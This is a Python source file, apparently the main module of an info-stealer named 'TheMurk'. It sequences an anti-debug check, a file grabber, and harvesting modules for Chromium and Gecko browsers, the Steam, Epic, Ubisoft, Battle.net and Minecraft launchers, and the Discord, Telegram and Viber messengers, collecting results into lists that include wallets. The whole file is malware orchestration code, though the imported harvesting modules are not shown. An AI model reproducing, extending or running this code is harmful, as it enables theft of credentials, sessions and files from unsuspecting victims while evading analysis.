from preferences.config import *
from manager.antiDebug import AntiDebug
from manager.folders import Folders
from targets.files.files import TxtFiles
from targets.files.file_grabber import Grab
from targets.browsers.chromium import Chromium
from targets.browsers.geckodriver import GeckoDriver
from targets.games.steam import Steam
from targets.games.epicgames import Epic
from targets.games.uplay import Ubisoft
from targets.games.battlenet import BattleNet
from targets.games.minecraft import Minecraft
from targets.messengers.discord import Discord
from targets.messengers.telegram import Telegram
from targets.messengers.viber import Viber

class TheMurk:
    def __init__(self) -> None:
        self.MainVars()
        self.Progress()
    
    def MainVars(self):
        self.name = ''
        self.password = ''
        self.np = []
        self.msgSys = ""
        self.msgBrowsers =[]
        self.msgOther =[]
        self.msgWallets =[]
        self.msgFiles = []
    
    def Progress(self):
        self.Start()
        self.GrabFiles()
        self.Browsers()
        self.Games()
        self.Messagers()

    def Start(self):
        if not config.debuging:
            AntiDebug(config.oneStart)
        Folders(config.enableFileGrabber)
    
    def GrabFiles(self):
        if config.enableFileGrabber:
            self.msgFiles = Grab(self.msgFiles)
        else:
            TxtFiles()
    
    def Browsers(self):
        self.msgBrowsers = Chromium()
        self.msgBrowsers = GeckoDriver(self.msgBrowsers)


    def Games(self):
        self.msgOther = Steam(self.msgOther)
        self.msgOther = Epic(self.msgOther)
        self.msgOther = Ubisoft(self.msgOther)
        self.msgOther = Minecraft(self.msgOther)
        self.msgOther = BattleNet(self.msgOther)
    
    def Messagers(self):
        self.msgOther = Discord(self.msgOther)
        self.msgOther = Telegram(self.msgOther)
        self.msgOther = Viber(self.msgOther)
        #self.msgOther = whatsapp.WhatsApp(self.msgOther)
        #self.msgOther = pidgin.Pidgin(self.msgOther)
